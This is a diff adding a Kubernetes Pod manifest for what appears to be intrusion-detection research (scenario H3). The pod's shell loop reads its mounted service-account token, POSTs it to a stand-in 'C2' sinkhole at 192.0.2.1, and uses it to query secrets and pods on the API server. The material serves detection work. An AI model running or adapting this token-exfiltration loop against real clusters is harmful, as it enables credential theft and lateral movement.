@@ -1,0 +1,85 @@
+# H3 attack: service-account token theft. The pod reads its own mounted token,
+# POSTs it to a sinkhole (192.0.2.1, RFC 5737) and uses it against the in-cluster
+# API server, which answers 403 under default RBAC. The syscall sequence is the
+# same as for a successful theft.
+#
+# Replaces a cryptominer (XMRig): at ~3 syscalls/s in the captured event set it
+# was indistinguishable from benign pods.
+apiVersion: v1
+kind: Pod
+metadata:
+  # Not part of a protected deployment; run_h3.py admits it by name.
+  name: token-attacker
+  namespace: default
+  labels:
+    role: attacker
+    scenario: h3
+    attack-class: credential-access
+  annotations:
+    ids-research.io/mitre-attack: "T1528 (Steal Application Access Token), T1550.001 (Application Access Token)"
+    ids-research.io/sinkhole: "192.0.2.1 (RFC 5737 TEST-NET-1)"
+spec:
+  containers:
+    - name: attacker
+      image: alpine:3.20
+      imagePullPolicy: IfNotPresent
+      command:
+        - /bin/sh
+        - -c
+        - |
+          set -e
+          apk add --no-cache curl > /dev/null
+          echo "[token-attacker] dependencies installed"
+
+          TOKEN_FILE=/var/run/secrets/kubernetes.io/serviceaccount/token
+          NS_FILE=/var/run/secrets/kubernetes.io/serviceaccount/namespace
+          CA_FILE=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
+
+          if [ ! -r "$TOKEN_FILE" ]; then
+            echo "[token-attacker] ERROR: token file not mounted (automountServiceAccountToken=false?)"
+            exit 1
+          fi
+
+          TOKEN=$(cat "$TOKEN_FILE")
+          NS=$(cat "$NS_FILE")
+          TOKEN_LEN=${#TOKEN}
+          echo "[token-attacker] stolen credentials: ns=$NS token_length=$TOKEN_LEN"
+
+          C2="http://192.0.2.1/c2"
+          API="https://kubernetes.default.svc"
+
+          echo "[token-attacker] entering exfil + lateral-movement loop"
+          iter=0
+          while true; do
+            iter=$((iter + 1))
+
+            # 1. Send the token to the "C2" sinkhole.
+            curl -m 5 -s -X POST \
+              -H "Content-Type: application/json" \
+              --data-binary "{\"token\":\"$TOKEN\",\"ns\":\"$NS\",\"iter\":$iter}" \
+              "$C2" >/dev/null 2>&1 || true
+
+            # 2-3. Use the token against the API server (expected 403).
+            curl -m 5 -s -k \
+              -H "Authorization: Bearer $TOKEN" \
+              "$API/api/v1/namespaces/$NS/secrets" >/dev/null 2>&1 || true
+
+            curl -m 5 -s -k \
+              -H "Authorization: Bearer $TOKEN" \
+              "$API/api/v1/namespaces/$NS/pods" >/dev/null 2>&1 || true
+
+            # 4. Re-read the credential files.
+            cat "$TOKEN_FILE" > /dev/null
+            cat "$NS_FILE"    > /dev/null
+            cat "$CA_FILE"    > /dev/null
+
+            sleep 1
+          done
+      resources:
+        requests:
+          cpu: "100m"
+          memory: "64Mi"
+        limits:
+          cpu: "200m"
+          memory: "128Mi"
+  restartPolicy: Never
